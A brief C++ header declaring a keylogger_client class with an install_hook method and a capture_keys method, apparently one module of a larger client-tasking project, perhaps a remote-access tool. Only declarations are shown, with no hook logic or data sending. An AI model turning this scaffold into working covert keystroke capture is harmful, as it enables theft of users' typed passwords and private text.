#pragma once
#include <cstdint>
#include <Windows.h>
#include <task\client_tasks\keylogger\keyhook.h>

class keylogger_client
{
	MSG msg;
	BOOL bRet;
	uint32_t seconds;

	bool install_hook();
public:
	keylogger_client();
	bool capture_keys();
};

